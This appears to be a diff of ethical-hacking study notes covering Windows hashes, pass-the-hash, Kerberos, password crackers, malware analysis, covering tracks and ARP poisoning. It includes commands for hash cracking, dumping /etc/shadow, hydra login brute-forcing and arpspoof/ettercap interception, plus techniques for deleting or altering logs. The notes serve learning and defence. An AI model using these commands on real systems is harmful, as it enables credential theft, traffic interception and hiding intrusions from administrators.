-- **Weaknesses**
-  - No salting allowing MITM attacks (through [pass the hash](#pass-the-hash-attack) and rainbow tables).
-  - If password is less than 7 characters second half is always `0xAAD3B435B51404EE`
-  - Maximum allowed length is 14 characters
-  - Case insensitive: PassWord, PaSsWoRd, PASSword and other similar combinations are same as PASSWORD.
-  - 💡 Turned off as default since Windows Vista/Server 2008 as it's weak
-- **Cracking**
-
-  ```txt
-    john --format=lm hash.txt
-    hashcat -m 3000 -a 3 hash.txt
-  ```
-
-#### NTLM
-
-- Also known as ***NT LAN Manager***
-- Uses DES with MD4 hash, used in Windows NT until SP3
-- **NTLM Hash**
-  - Also known as ***NTLM hash***, ***NTHash***, ***NT hash**'.
-  - Algorithm: `MD4(UTF-16-LE(password))`
-    - UTF-16-LE is the little endian UTF-16
-  - E.g. `B4B9B02E6F09A9BD760F388B67351E2B`
-  - **Cracking**
-    1. Can be extracted using e.g. SAM database or [mimikatz](https://github.com/gentilkiwi/mimikatz)
-    2. Then
-
-    ```txt
-      john --format=netntlm hash.txt
-      hashcat -m 5500 -a 3 hash.txt
-    ```
-
-##### NTLMv1
-
-- Also known as ***Net-NTLMv1***
-- Uses both the NT and LM hash, depending on configuration and what is available.
-- Deprecated, but still used in some old systems on the network.
-- E.g.  
-
-  ```txt
-    u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c
-  ```
-
-- **Authentication flow**
-  1. `C = 8-byte server challenge, random`
-     - Server sends sending an 8-byte random number, the challenge
-  2. `K1 | K2 | K3 = NTLM-Hash | 5-bytes-0`
-     - Five zeroes are added to the hash to achieve 21 bytes
-     - 21 bytes is split into three 7 byte parts
-  3. `response = DES(K1,C) | DES(K2,C) | DES(K3,C)`
-     - Each part is used as key in DES
-     - Three encryptions are reunited to form the 24-byte response
-- **Cracking**
-  - 💡 Easy to crack as it lacks salting
-  1. Can be captured using [Responder](https://github.com/lgandx/Responder)
-  2. Then
-
-  ```txt
-    john --format=netntlm hash.txt
-    hashcat -m 5500 -a 3 hash.txt
-  ```
-
-##### NTLM v2
-
-- Also known as ***Net-NTLMv2***
-- Uses MD5
-- Introduced in Windows NT 4.0 SP1 (Windows 2000)
-- E.g.
-
-  ```txt
-    admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030
-  ```
-
-- Replaces NTLM with
-  - stronger cryptography against spoofing attacks
-  - ability to authenticate the client
-- **Authentication flow**
-  1. `SC = 8-byte server challenge, random`
-     - Server sends sending an 8-byte random number, the challenge
-  2. `CC = 8-byte client challenge, random`
-     - 8-byte random value for the challenge
-  3. `CC* = (X, time, CC2, domain name)`
-     - `time`: the current time in NT Time format
-     - `CC2`: an 8-byte random value
-     - `X`: fixed contents of a formatting field.
-  4. `v2-Hash = HMAC-MD5(NT-Hash, user name, domain name)`
-     - HMAC-MD5 hash of users password and domain name with other identifying information
-  5. `LMv2 = HMAC-MD5(v2-Hash, SC, CC)`
-  6. `NTv2 = HMAC-MD5(v2-Hash, SC, CC*)`
-  7. `response = LMv2 | CC | NTv2 | CC*`
-- Cracking it
-  1. Can be captured using [Responder](https://github.com/lgandx/Responder)
-  2. Then:
-
-  ```txt
-    john --format=netntlmv2 hash.txt
-    hashcat -m 5600 -a 3 hash.txt
-  ```
-
-### Pass the hash attack
-
-- Also known as **pass-the-hash**
-- Allows gaining access to systems without accessing password in plaintext
-- Can be used on any systems using LM or NTLM authentication
-- Exploits static hash that's shared between sessions in authentication protocol
-- Helps to hack Windows user name, domain name, and password hashes
-- Can dump hashes
-  - from compromised machines by e.g. [Windows Credentials Editor](https://www.ampliasecurity.com/research/wcefaq.html) and [Pass-the-Hash Toolkit](https://en.wikipedia.org/wiki/Pass_the_hash)
-  - or sniff the network
-- Allows privilege escalation as domain administrators connected to machine also leaves their hashes.
-
-## Kerberos authentication
-
-- Network authentication protocol for client/server applications
-- Protects against replay attacks and eavesdropping
-- Uses both symmetric and asymmetric encryption
-- Uses TCP/UDP port 88
-- **Mutual authentication**
-  - Both parties verifies each others identity using tickets.
-
-### Kerberos authentication components
-
-- Requires **Key Distribution Center (KDC)** that consists of:
-  - **Authentication server (AS)**
-  - **Ticket Granting Server (TGS)**
-- **Ticket Granting Ticket (TGT)**
-  - Small, encrypted file with limited validity
-  - Protects users from MITM attacks
-  - Includes session key, its expiration date, and the user's IP address
-
-### Kerberos authentication flow
-
-1. Client asks KDC (who has AS and TGS) for ticket to authenticate throughout the network.
-   - This request is in clear text.
-2. Server responds with secret key.
-   - Hashed by the password copy kept on AD server (TGT).
-3. TGT sent back to server requesting TGS if user decrypts.
-4. Server responds with ticket, and client can log on and access network resources.
-
-### Pass the ticket attacks
-
-- Also known as **pass-the-ticket**
-- Authentication Method using Kerberos tickets without having access to an account's password.
-- Kerberos tickets are retrieved e.g. from memory on a system
-- Tools include [mimikatz](https://github.com/gentilkiwi/mimikatz) and [Rubeus](https://github.com/GhostPack/Rubeus)
-# Password cracking tools
-
-- See also [Web server password cracking tools | Web server threats and attacks](./../12-web-servers/web-server-threats-and-attacks.md#web-server-password-cracking-tools)
-
-## `crunch`
-
-- Generates password dictionaries.
-- E.g. `crunch <min-length> <max-length> <character-pool> -o <file-name>`
-- Difficulty/time grows exponentially not linearly
-  - Takes much longer when you e.g. increase total chars in a password.
-  - E.g. `crunch 4 16 abcekfeafkapeo434@*.` generates thousands of petabytes.
-
-## John the Ripper
-
-- Also known as • ***JtR*** or ***`john`***
-- 📝 Auto-detects OS password based on dictionary or brute-force attacks.
-- Tries different passwords and compares their hashes to OS password
-- Supports Windows, Linux and macOS.
-- 📝 Usage:
-  1. Dump OS password to a file.
-     - E.g. on Linux, John has `unshadow` tool that can be used.: `unshadow /etc/passwd /etc/shadow > mypasswd`
-  2. Crack password file using default order: `john mypasswd`
-     - Passwords are saved in `$JOHN/john.pot`
-     - You can also run `john --show mypasswd` to see the passwords
-
-## Hydra
-
-- Parallelized login cracker for different network protocols such as HTTP, Cisco, MySQl.
-- 💡 You can use [DVWA: damn vulnerable web app](http://www.dvwa.co.uk/) for educational purposes & learning pen-testing
-- E.g. `hydra -L usernamelist.txt -P passlist.txt -e ns -F -t 1 -w 10 <host-ip-address> http-form-post "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -v`
-  - `-e ns`: e additional options
-    - `n`: try null (for empty password)
-    - `s`: try also same password as a user name
-  - `-t 1`: number of tasks (based on threads), default is 16
-    - ❗ Careful. Too many connections and too quick = Detected immediately
-  - `-w 10`: waiting time of 10 ms
-  - `<host-ip-address>`
-    - Usually people go to the target using proxies and examine results in proxies.
-      - E.g. [burp suite](./../05-vulnerabilities/vulnerability-analysis.md#burp-suite)
-  - `http-form-post "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed`
-    - Posts data to server as the HTML does
-    - `Login failed`: text to search in result page to determine whether the login has failed.
-
-## Hashcat
-
-- Very fast, GPU-based password cracker with in-kernel rule engine
-- Can do dictionary hash attack, brute force hash, role based attack and more
-- [Website](https://hashcat.net/hashcat/) | [source code](https://github.com/hashcat/hashcat)
-- 💡 Good idea to use in cloud to get more compute power.
-- Proper drivers are required for e.g. AMD and Intel and NVIDIA
-- E.g. cracking Linux OS password
-  - `./hashcat64.bin -a 3 -m 1800 ?u?l?l?l?d?d?d`
-    - `-m 1800`: Hash mode `sha512crypt $6$, SHA512 (Unix)`
-    - `-a 3 ?u?l?l?l?d?d?d`: Mask attack
-      - Brute-force on user specified character sets
-      - `?u?l?l?l?d?d?d`= uppercase + lowercase + lowercase + lowercase + number + number + number
-      - 💡 Do certain assumptions or it might take until the next big bang to crack the password.
-      - E.g. usually passwords start with capital letter and continues with lowercase letters
-
-## Password recovery tools
-
-- [Elcomsoft Distributed Password Recovery](https://www.elcomsoft.com/edpr.html)
-  - Data recovery and password recovery services
-  - Runs on Windows
-  - For forensic and government agencies
-  - Can crack systems passwords for Windows, Unix and Mac OS and many more other passwords.
-- [Passware Kit Forensic](https://www.passware.com/kit-forensic/)
-  - Tool for encrypted electronic evidence discovery and decryption
-  - Can crack systems passwords for Windows, Unix and Mac OS and [many more other passwords](https://www.passware.com/kit-forensic/filetypes/).
-
-### Windows password reset tools
-
-- Resets Windows login passwords.
-- Often can run from a bootable USB or CD/DVD.
-- Include • [Stellar Password Recovery](https://www.stellarinfo.com/password-recovery/password-recovery-software.php) • [Windows Password Recovery Pro ISeePassword](https://www.iseepassword.com/windows-password-recovery.html) • [Windows Password Recovery Tool](https://www.windowspasswordsrecovery.com/) • [Windows Password Refixer](https://www.isumsoft.com/windows-password-refixer/) • [PCUnlocker](http://www.pcunlocker.com/)
-
-#### chntpw
-
-- Also known as [Offline NT Password & Registry Editor](http://www.chntpw.com/)
-- 📝 Linux utility used for resetting or blanking local passwords used by Windows.
-# Malware analysis
-
-- Reverse engineering of a malware program
-- Purpose is to
-  - determine how the malware works
-  - assess the potential damage it could cause
-- Helps find and remove the infections that exist in a system through using designed tools an techniques.
-
-## Malware analysis types
-
-### Static malware analysis
-
-- Analyzing the malware without running or installing it
-- Malware's binary code is examined
-- Checks for any data structures or function calls that have malicious behavior.
-
-### Dynamic malware analysis
-
-- Requires the malware program to be running in a monitored environment such as sandbox or a virtual machine.
-- Helps in understanding how the malware works by monitoring its activities on the system.
-
-#### Windows integrity monitoring
-
-##### Port monitoring
-
-- Involves monitoring services running on different ports.
-- Features can include
-  - analytics for packet rates, CPU, power, and bandwidth of ports
-  - mirroring the traffic from one port to another
-- 📝 Tools include
-  - `netstat` (terminal)
-    - Displays network connections, available on many OSes
-    - E.g. `netstat -an` to display all connections and listening ports (`-a`) in a numerical format `-n`
-  - [TCPView](https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview) (GUI)
-    - Windows tool to enumerate network connections and owner processes
-    - Refreshes automatically
-  - [CurrPorts](https://www.nirsoft.net/utils/cports.html) (GUI)
-    - View open ports and connections per process on Windows
-- See also • [Common ports to scan | Scanning networks](./03-scanning-networks/../../03-scanning-networks/scanning-networks-overview.md#common-ports-to-scan) • [Common ports and services to enumerate](./../04-enumeration/enumeration-overview.md#common-ports-and-services-to-enumerate)
-
-##### Process monitoring
-
-- Use e.g. [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) to see what processes malware starts
-- Built-in `sc` command provides all sorts of information about running services on a Windows machine.
-  - E.g. `sc query` to lists the running services
-
-##### Registry monitoring
-
-- Registry contains information, settings, options, and other values for programs and hardware installed on all versions of Microsoft Windows operating systems.
-- Malware modifies registry including keys such as `Run`, `RunServices`, `RunOnce`, `RunServicesOnce`, `HKEY_CLASSES_ROOT\exefile\shell\open\command "%1" %*.`
-- Use native `regedit` or e.g. [RegScanner](https://www.nirsoft.net/utils/regscanner.html), [Registry Viewer](https://accessdata.com/product-download/registry-viewer-2-0-0), [Active Registry Monitor](https://www.devicelock.com/arm/) to monitor registry changes.
-
-##### Windows services monitoring
-
-- Malware usually install and run themselves as services.
-- Use e.g. [Windows Service Manager (SrvMan)](https://sysprogs.com/legacy/tools/srvman/), [Process Hacker](https://processhacker.sourceforge.io/), [AnVir Task manager](https://www.anvir.com/) to monitor services
-
-##### Startup programs monitoring
-
-- Malware modify startup settings to execute themselves when system starts
-- Check:
-  - Startup registry keys
-  - Automatically loaded drivers
-  - `boot.ini` or `bcd` (`bootmgr`) entries
-  - Services that starts automatically in `services.msc`
-  - Startup folder
-- Tools include [Autoruns for Windows](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns), [Autorun Organizer](https://www.chemtable.com/autorun-organizer.htm), [WinTools.net: Startup Manager](http://wintools.net/startup/index.html)
-
-##### Event logs monitoring/analysis
-
-- Analyze logs on IDS/IPS, web servers, authentication servers etc.
-- In Windows you can use Event Viewer to see system, application and security logs
-- Tools include [Loggly](https://www.loggly.com/), [SolarWinds Security Event Manager (SIEM)](https://www.solarwinds.com/security-event-manager), [Splunk](https://www.splunk.com/)
-
-##### Installation monitoring
-
-- See what has been modified during installation process
-- Tools include [SysAnalyzer](http://sandsprite.com/iDef/SysAnalyzer/), [Mirekusoft Install Monitor](https://www.mirekusoft.com/), [Revo Uninstaller Pro](https://www.revouninstaller.com/)
-
-##### Files and folder monitoring
-
-- Scan system files for suspicious files and folders
-- Tools include:
-  - `Sigverif`
-    - Built-in Windows tool
-    - Identifies unsigned drivers
-  - [Tripwire File Integrity Manager](https://www.tripwire.com/products/tripwire-file-integrity-manager)
-  - [CSP File Integrity Checker](https://www.cspsecurity.com/solutions/compliance-and-file-monitoring/file-integrity-checker/).
-
-##### Device drivers monitoring
-
-- Malware installs with some infected drivers
-- Drivers can be seen by: Run -> `msinfo32` -> Software Environment -> System Drivers
-- Tools include [DriverView](https://www.nirsoft.net/utils/driverview.html), [Driver Booster](https://www.iobit.com/en/driver-booster.php)
-
-##### Network traffic monitoring/analysis
-
-- Includes capturing traffic to look for malware activity
-- Tools for capturing and monitoring include: [Wireshark](https://www.wireshark.org/), [Capsa Network Analyzer](https://www.colasoft.com/capsa/)
-
-##### DNS monitoring/resolution
-
-- DNSChanger is a DNS hijacking Trojan that can point DNS entries toward malicious name servers.
-- Use e.g. [DNSQuerySniffer](https://www.nirsoft.net/utils/dns_query_sniffer.html), [DNSstuff](https://www.dnsstuff.com/).
-
-##### API calls monitoring
-
-- Malware use Windows APIs to perform malicious task
-- API call monitoring tools include [API Monitor](http://www.rohitab.com/apimonitor), [Runscope](https://www.runscope.com/)
-
-##### System baselining
-
-- Allows monitoring security configuration changes over time
-- Flow
-  1. Take snapshots before and then after malware execution.
-  2. Compare the snapshots to understand changes made by the malware.
-
-#### Unix integrity monitoring
-
-- Display processes: `ps -ef`
-  - `-e`: selects all processes
-  - `-f`: switch provides a full listing
-
-## Sandboxing
-
-- Technique in which you create an isolated test environment
-  - Allows secure experimentation
-  - Nothing (no harm) can be spilled out of the environment.
-    - If something happens, the damage is confined to that sandbox
-- Examples
-  - **Chrome web-browser**
-    - Sandboxing through multi-process architecture.
-    - One or more processes are assigned to run scripts of each site.
-    - Each Chrome extension and app runs in its own process
-  - **Virtual machines**
-    - Good for testing / reverse engineering malware
-    - E.g. YouTubers messing with scammers utilizes virtual machines, [video](https://www.youtube.com/watch?v=BQ3FD26Bv8c), [video](https://www.youtube.com/watch?v=vgYeDMwteZo)
-    - 💡 Good hypervisor is important to ensure nothing goes out of the environment.
-      - E.g. KVM (used by AWS) is good on AWS, and Hyper-V in Windows
-        - KVM installation in Fedora: `dnf install @Virtualization` and then `virt-manager` to start a GUI.
-      - VirtualBox is not as feature rich.
-    - 💡 Make sure host environment is safe in first place
-      - E.g. in Linux you can enable [Security-Enhanced Linux](https://en.wikipedia.org/wiki/Security-Enhanced_Linux) (SELinux).
-        - Supported by Fedora, Debian, Ubuntu, used by default by Android.
-        - `setenforce 1` to enable, `getenforce` to query status
-
-## Anti-malware software
-
-- Includes e.g. antivirus, anti-spyware, anti-trojans, anti-spamware, anti-phishing, and email scanners.
-- Helps detecting, mitigating, preventing and repairing any damage by malware.
-- Looks for behavior typical to viruses and give warnings.
-- Looks for already known virus signatures and warns the user if a threat is found.
-- E.g. Kaspersky, McAffee, AVG, Norton, Avira, Bitdefender
-
-### Detection types
-
-- **Signature-based**
-  - Compare file hash and malware hash
-  - ❗ Anything new or custom written will not be detected
-- **Rule-based (behavior-based)**
-  - 📝 Relies on differentiating expected vs anomalous behavior
-  - Analyzes certain characteristics of a program.
-    - E.g. application accessing user login file. Why?
-  - Can utilize AI & ML to decide whether something is a malware.
-- **Sandboxing**
-  - Creates environment, lets program run and examines its behavior.
-  - Good to find out behavior of e.g. self-modifying code, encrypted code.
-
-## 📝 Virus detection methods
-
-- **Scanning**
-  - Scans malware for known signatures (characteristics)
-  - ❗ Only known and predefined viruses can be detected
-- **Integrity checking**
-  - Verifies files against their recorded integrated data
-- **Interception**
-  - Intercepts the virus if it detect suspicious behavior (e.g. network access) and asks user if the user wants to continue.
-  - Useful for logic bombs (only executed if certain conditions are met) or trojans
-- **Code emulation**
-  - Executes a virtual machine mimicking CPU and memory
-  - Useful against encrypted, polymorphic or metamorphic viruses
-- **Heuristic analysis**
-  - Helps in detecting new or unknown viruses
-  - **Static**: anti-virus decompiles and analyzes the binary
-  - **Dynamic**: anti-virus runs code emulation to determine if the code is viral
-  - Prone to many false positives
-
-## Malware countermeasures
-
-- Use up-to-date anti-virus, firewall and intrusion detection software with regular scans
-- Block all unnecessary ports at the host and firewall.
-- On Windows
-  - Enable Windows Defender
-  - Enable [Data Execution Prevention (DEP)](#data-execution-prevention-dep)
-  - Run registry monitoring tools to find malicious registry entries added by the backdoor
-- Enable [Address space layout randomization (ASLR)](#address-space-layout-randomization-aslr)
-- Do not open files with more than one file type extension
-- Use [anti-malware software](#anti-malware-software)
-- Avoid accepting executables sent as messages or downloaded from untrusted sources.
-- Inspect network packets using protocol monitoring tools
-
-### Data Execution Prevention (DEP)
-
-- 📝 Marks memory regions as non-executable, such that an attempt to execute machine code in these regions will cause an exception
-- Executable space protection in Windows
-- Read more on [Data Execution Prevention | Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention)
-
-### Address space layout randomization (ASLR)
-
-- 📝 Prevents exploitation of memory corruption vulnerabilities.
-- Involves randomly positioning the base address of an executable and the position of libraries, heap, and stack, in a process's address space
-- Breaks assumptions that attackers could make about where programs and libraries would lie in memory at runtime
+# Covering tracks
+
+- Attempt to hide attackers presence on the system so the system appears uncompromised.
+- To avoid detection the attacker needs to
+  - modify the system logs and delete their activity during the attack.
+  - ensure that future activities are not logged
+- You can mitigate damage by reducing footprint by e.g. making your access disguise a legit process.
+- 💡 Have an exit strategy prior to breaking in by getting to know OS type, log types, policies (e.g. log altered alarms) and applications running on it.
+  - E.g. if you know OS you can know where in general the OS keeps logs (e.g. `/var/log/`)
+  - ❗ There's no universal way to figure out where all the logs are in a system
+- Log file permissions
+  - Common and big mistake: bad permissions on log files
+    - Allows access from a lot of users that shouldn't
+  - E.g. to read system messages you need to become root `sudo tail /var/log/messages`
+- Terminal history
+  - Might leave footprints here for commands you run.
+  - Good place to learn about the user (they sometimes write passwords by mistake).
+  - You can run `history` to get the history.
+    - In (fedora) saved in `home/<username>/.bash_history`
+
+## Security logs
+
+### Windows security logs
+
+- Event logs for are stored in `C:\Windows\System32\winevt\Logs`
+- Can use OS tool "Windows Event Viewer" to navigate the logs
+- Logs are categorized as application, security and system.
+
+### Linux security logs
+
+- Centralized repository of log files are in `/var/log` directory.
+  - See also [Linux folders | Linux basics](./linux-basics.md#linux-folders)
+- 📝 Log folders include
+  - `/var/log/messages` | `/var/log/syslog` (debian-based)
+    - Generic system activity logs
+  - `/var/log/auth.log` (Debian and Ubuntu) | `/var/log/secure` (RedHat and CentOS)
+    - Authentication/authorization related events
+    - E.g. [SSH](./../15-cryptography/tunneling-protocols.md#ssh-secure-shell) logs
+  - • `/var/log/utmp` • `/var/log/wtmp` • `/var/log/btmp` | `/var/log/faillog`
+    - Login/logout events
+  - `/var/log/lastlog`
+    - Display information about a user's last login time
+  - `/var/log/cron`
+    - Cron service logs
+    - Can include failed authorizations
+  - `/var/log/secure`
+    - Authentication and authorization privileges.
+    - E.g. sshd logs including unsuccessful login.
+
+## Techniques of covering tracks
+
+- **Disabling auditing**
+  - Disabling auditing features of the system
+  - Disabling logging is difficult
+    - Hard to know what kind of logs are being collected
+    - Can include OS logs, additional security mechanisms logs, side applications logs..
+    - Usually requires system restart for disabling of logs
+      - E.g. if you use SELinux (can check with `getenforce`) it has different modes: • permissive (just logs) • enforcing and • disabled state
+        - Setting its state to disabled requires a restart.
+- **Clearing logs**
+  - Deleting the attacker's logged activities
+  - ❗Suspicious if all logs are deleted may raise alarms.
+- **Manipulating logs**:
+  - Changing the logs to prevent detection
+  - E.g. search and replace your IP
+- To cover tracks on network, attackers use
+
+### Covering tracks on network
+
+- **Reverse shell**
+  - Target system sends a request to the remote system to act on the response.
+  - **Reverse HTTP shells**
+    - Asks the master system for commands to execute on the target machine
+  - **Reverse ICMP tunnels**
+    - Accessing the system by using ICMP echo and reply packets as carriers of TCP payload
+- **DNS tunneling**
+  - Adding data payload to the target's DNS server to create a back channel to steal information
+- **TCP parameters**
+  - Using TCP parameters for payload distribution.
+  - Fields in which data can be hidden are e.g.
+    - IP identification field, TCP acknowledgement number, and TCP initial sequence number.
+
+### Tools for covering tracks
+
+- [Privacy.sexy](https://privacy.sexy): Online/offline nad open source tool that can cleanup logs and personal activities.
+- [Auditpol](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/auditpol): Microsoft tool to manipulate audit policies.
+- [MRU-blaster](https://www.brightfort.com/mrublaster.html): Find and remove 30,000 MRU lists.
 # Malware overview
 
 - Malicious program designed
@@ -6342,298 +6012,218 @@ environment variable named `HTTP_SIKE` available in your CGI.
 - **Sparse infector**
   - Only fire when a specific condition is met
   - E.g. a virus which infects only the 20th time a file is executed.
-# ARP poisoning
+# Malware analysis
 
-## ARP
+- Reverse engineering of a malware program
+- Purpose is to
+  - determine how the malware works
+  - assess the potential damage it could cause
+- Helps find and remove the infections that exist in a system through using designed tools an techniques.
 
-- ARP stands for "Address Resolution Protocol"
-- 📝 In charge of resolving IP addresses to MAC addresses
-- Can be used for obtaining MAC addresses of devices on the network
-- Packets are `ARP_REQUEST` and `ARP_REPLY`
-- Commands
-  - `arp -a`: displays current ARP cache
-  - `arp -d *`: clears ARP cache
+## Malware analysis types
 
-### ARP table
+### Static malware analysis
 
-- Used to map MAC addresses to ip addresses
-- Every network interface has its own ARP table
-- 📝 If no ARP entry exist:
-  1. Computer A broadcasts an APR request in network asking for the MAC address from a specific IP.
-  2. Computer B replies its MAC and IP address
-  3. Computer A inserts it to its ARP table for future use
+- Analyzing the malware without running or installing it
+- Malware's binary code is examined
+- Checks for any data structures or function calls that have malicious behavior.
 
-## ARP poisoning attack
+### Dynamic malware analysis
 
-- Also known as • ***ARP spoofing*** • ***ARP spoofing*** • ***ARP cache poisoning*** • ***ARP poison routing*** • ***ARP cache flooding*** • ***ARP flooding***.
-- Man in the middle attack between the victim and switch.
-- Floods the target machines ARP cache with forged requests and responses.
-- Exploits ARP not verifying the device authenticity
-- If ARP cache becomes full, different behaviors can be observed depending on the manufacturer/implementation:
-  - May [force switch to operates in fail-safe mode](https://www.trendmicro.com/vinfo/se/threat-encyclopedia/archive/security-advisories/arp%20flooding%20attack)
-    - Behaves as a hub i.e. sends packets to every to all hosts
-    - Same behavior is also seen in [MAC flooding](./sniffing-attacks-overview.md#mac-flooding-attack)
-  - In [Linux](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/core/neighbour.c#n388) it may:
-    - Drop the oldest / most stale entry from the table (by garbage collector)
-    - Reject new entries
+- Requires the malware program to be running in a monitored environment such as sandbox or a virtual machine.
+- Helps in understanding how the malware works by monitoring its activities on the system.
 
-### ARP poisoning attack steps
+#### Windows integrity monitoring
 
-1. **Gather information**
-   1. Get victim IP address, e.g. `192.168.122.183`
-      - E.g. through [host discovery using `nmap`](./../03-scanning-networks/scanning-tools.md#-p-ping-host-discovery-options) e.g. `nmap -sn 192.168.0.0/24`
-   2. Get default gateway IP, e.g. `192.168.122.1`
-      - Usually IP of the machine ending with `.1`
-      - Usually same for everyone on same network
-      - Default gateway is the forwarding host (router) to internet when no other specification matches the destination IP address of a packet.
-2. **Enable forwarding mode to sniff the traffic**
-   - `echo 1 > /proc/sys/net/ipv4/ip_forward` in Linux.
-   - ❗Otherwise no traffic is going through and you're just DOSing.
-3. **Attack**
-   - ![ARP spoofing attack](./img/arp-spoofing-during.png)
-   - Deceive the victim device through flooding ARP reply packets to it.
-     - Change gateways MAC address is to the attackers
-   - 📝 Use an ARP spoofing tool e.g.
-     - [`arpspoof`](https://linux.die.net/man/8/arpspoof)
-       - `arpspoof -t <victim-machine-ip> <default-gateway-ip>`
-       - `arpspoof -t <default-gateway-ip> <victim-machine-ip>`
-     - [`ettercap`](https://www.ettercap-project.org/)
-       - Also sniffs passwords automatically
-       - `ettercap -NaC <default-gateway-ip> <victim-machine-ip>`
-         - `N`: make it non-interactive
-         - `a`: arp posion
-         - `c`: parse out passwords and usernames.
-     - [Cain and Abel (Cain & Abel)](./sniffing-tools.md#cain-and-abel) on Windows
-   - ![After ARP spoofing attack](./img/arp-spoofing-after.png)
-4. **Sniff**
-   - Now you sniff the traffic between two devices.
-     - If through HTTPS & SSL you can only see basic data such as User Agent and domain names.
-   - Can use e.g. [`wireshark`](https://www.wireshark.org/) or [dsniff](https://www.monkey.org/~dugsong/dsniff/)
+##### Port monitoring
 
-### ARP poisoning attack countermeasures
+- Involves monitoring services running on different ports.
+- Features can include
+  - analytics for packet rates, CPU, power, and bandwidth of ports
+  - mirroring the traffic from one port to another
+- 📝 Tools include
+  - `netstat` (terminal)
+    - Displays network connections, available on many OSes
+    - E.g. `netstat -an` to display all connections and listening ports (`-a`) in a numerical format `-n`
+  - [TCPView](https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview) (GUI)
+    - Windows tool to enumerate network connections and owner processes
+    - Refreshes automatically
+  - [CurrPorts](https://www.nirsoft.net/utils/cports.html) (GUI)
+    - View open ports and connections per process on Windows
+- See also • [Common ports to scan | Scanning networks](./03-scanning-networks/../../03-scanning-networks/scanning-networks-overview.md#common-ports-to-scan) • [Common ports and services to enumerate](./../04-enumeration/enumeration-overview.md#common-ports-and-services-to-enumerate)
 
-- Configure [DHCP snooping](./sniffing-attacks-overview.md#dhcp-snooping)
-- Add **static** IP-MAC entries to the cache.
-  - Then it will not process any ARP Replies received unlike a dynamic ARP cache.
-- Use Intrusion Detection Systems (IDS)
+##### Process monitoring
 
-## ARP poisoning countermeasures
+- Use e.g. [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) to see what processes malware starts
+- Built-in `sc` command provides all sorts of information about running services on a Windows machine.
+  - E.g. `sc query` to lists the running services
 
-- **ARP spoofing detection and prevention**
-  - Relies on some form of certification or cross-checking of ARP responses
-  - Can be implemented on individual hosts, hypervisors or switches
-  - 📝 E.g. [DHCP snooping](./sniffing-attacks-overview.md#dhcp-snooping) feature on switch OS can activate **Dynamic ARP Inspection** with an internal database.
-  - ❗ Not possible if any host holds a static IP, and static ARP entries must be used.
-- **Static ARP entries**
-  - Manually mapping IP addresses to MAC addresses (maintaining ARP entries)
-  - A lot of administrative overhead
-  - Provides only basic security
-- **OS security**
-  - Linux ignores unsolicited replies, behavior can often be configured in other OSes
-# Sniffing attacks overview
+##### Registry monitoring
 
-- [Spoofing attacks](./spoofing-attacks.md)
-- [ARP posioning](./arp-poisoning.md)
+- Registry contains information, settings, options, and other values for programs and hardware installed on all versions of Microsoft Windows operating systems.
+- Malware modifies registry including keys such as `Run`, `RunServices`, `RunOnce`, `RunServicesOnce`, `HKEY_CLASSES_ROOT\exefile\shell\open\command "%1" %*.`
+- Use native `regedit` or e.g. [RegScanner](https://www.nirsoft.net/utils/regscanner.html), [Registry Viewer](https://accessdata.com/product-download/registry-viewer-2-0-0), [Active Registry Monitor](https://www.devicelock.com/arm/) to monitor registry changes.
 
-## MAC flooding
+##### Windows services monitoring
 
-### MAC
+- Malware usually install and run themselves as services.
+- Use e.g. [Windows Service Manager (SrvMan)](https://sysprogs.com/legacy/tools/srvman/), [Process Hacker](https://processhacker.sourceforge.io/), [AnVir Task manager](https://www.anvir.com/) to monitor services
 
-- MAC address is a unique identifier of a network node.
-- E.g. `52:54:00:e5:83:bb`
-  - First three sets (`52:54:00`): Manufacturers signature
-  - Last three sets is set in different ways depending on manufacturers
-- Embedded in the device (firmware or some read-only part of the device)
-- In a network, each device has its own MAC address
-  - Associates the device with a physical port
-- 🤗 If your MAC address is logged, police can use it to contact the manufacturer to ask who purchased the device.
-  - Difficult to trace it if it was paid by cash.
-- 💡🤗 You may have free WiFi forever if you can change your MAC address.
-  - Usually checked in public places e.g. in an airport when they give you free WiFi.
+##### Startup programs monitoring
 
-#### Content Addressable Memory (CAM) table
+- Malware modify startup settings to execute themselves when system starts
+- Check:
+  - Startup registry keys
+  - Automatically loaded drivers
+  - `boot.ini` or `bcd` (`bootmgr`) entries
+  - Services that starts automatically in `services.msc`
+  - Startup folder
+- Tools include [Autoruns for Windows](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns), [Autorun Organizer](https://www.chemtable.com/autorun-organizer.htm), [WinTools.net: Startup Manager](http://wintools.net/startup/index.html)
 
-- Used by switches
-- Stores all available MAC addresses and their virtual LAN parameters for each port.
-- Possible to sniff by flooding it.
+##### Event logs monitoring/analysis
 
-### MAC flooding attack
+- Analyze logs on IDS/IPS, web servers, authentication servers etc.
+- In Windows you can use Event Viewer to see system, application and security logs
+- Tools include [Loggly](https://www.loggly.com/), [SolarWinds Security Event Manager (SIEM)](https://www.solarwinds.com/security-event-manager), [Splunk](https://www.splunk.com/)
 
-- Flooding the switch with thousands of MAC address mappings such that it cannot keep up.
-  - When the table can't keep up it starts sending every message out to every port.
-  - I.e. switch is forced to behave as a hub.
-- Allowed by the fixed size of the CAM table.
-- Steps:
-  1. Send large number of fake MAC addresses to the switch until CAM table becomes full
-  2. Switch enters fail-open mode
-     - where it broadcasts the incoming traffic to all ports on the network
-  3. Attacker (with promiscuous mode) starts sniffing the traffic passing through the network.
-- Can be followed up using [ARP spoofing](./arp-poisoning.md) to retain access to data after switches recover.
-- See also [MAC spoofing](./spoofing-attacks.md#mac-spoofing)
+##### Installation monitoring
 
-## DHCP attacks
+- See what has been modified during installation process
